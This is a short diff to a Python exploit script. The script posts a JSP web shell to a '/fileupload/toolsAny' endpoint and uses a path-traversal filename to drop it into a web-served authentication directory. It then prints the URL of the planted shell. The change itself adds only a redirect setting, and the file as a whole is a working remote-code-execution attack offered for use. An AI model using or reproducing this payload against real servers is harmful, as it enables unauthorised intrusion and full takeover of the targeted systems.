@@ -40,7 +40,7 @@ shell= '''<%@ page import="java.util.*,java.io.*"%>
 
 def exploit(url):
     try:
-        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/dailytools.jsp": shell})
+        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False,allow_redirects=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/dailytools.jsp": shell})
         if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
             # print(resp.content)
             console.log(f"[green][<>] Successfully exploited, url : [bold]{url}/authenticationendpoint/dailytools.jsp[/bold][/green]")
